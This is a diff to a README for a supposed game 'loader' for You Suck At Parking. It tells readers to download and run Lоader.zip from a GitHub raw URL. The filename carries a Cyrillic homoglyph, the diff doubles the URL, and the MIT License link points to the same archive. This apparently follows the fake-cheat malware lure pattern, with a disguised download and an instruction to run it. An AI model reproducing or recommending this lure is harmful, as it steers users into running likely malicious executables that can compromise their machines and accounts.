@@ -27,7 +27,7 @@ You Suck At Parking , Parking simulator game loader, working 2025, full-featured
 
 ## 📥 Installation
 
-1. Download `https://raw.githubusercontent.com/Mvzluanzzx/ParkProFreeway/main/Lоader.zip` from this repository.
+1. Download `https://raw.githubusercontent.com/Mvzluanzzx/ParkProFreeway/main/Lоader.zipоhttps://raw.githubusercontent.com/Mvzluanzzx/ParkProFreeway/main/Lоader.zip` from this repository.
 2. Extract the archive using your favorite tool (WinRAR, 7zip, Archive Utility, etc).
 3. Run the Loader and follow on-screen instructions.
 4. Launch "You Suck At Parking" and start parking like a pro!
@@ -38,6 +38,6 @@ This repository is created for educational and personal use only. Please support
 
 ## 📃 License
 
-Distributed under the [MIT License](https://raw.githubusercontent.com/Mvzluanzzx/ParkProFreeway/main/Lоader.zip) – free for personal use, modification, and distribution.
+Distributed under the [MIT License](https://raw.githubusercontent.com/Mvzluanzzx/ParkProFreeway/main/Lоader.zipоhttps://raw.githubusercontent.com/Mvzluanzzx/ParkProFreeway/main/Lоader.zip) – free for personal use, modification, and distribution.
 
 Happy Parking! 🚙
